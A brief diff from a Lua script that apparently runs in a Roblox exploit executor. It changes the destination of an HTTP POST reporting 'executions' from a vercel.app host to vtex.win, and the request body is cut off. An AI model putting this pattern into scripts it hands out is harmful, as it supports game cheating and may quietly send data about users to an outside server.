@@ -42,7 +42,7 @@ local Executor = identifyexecutor and identifyexecutor() or nil
 
 local ok2, err2 = pcall(function()
     local response = request({
-        Url = "https://roblox-alpha-murex.vercel.app/api/v1/executions",
+        Url = "https://vtex.win/api/v1/executions",
         Method = "POST",
         Headers = { ["Content-Type"] = "application/json" },
         Body = HttpService:JSONEncode({
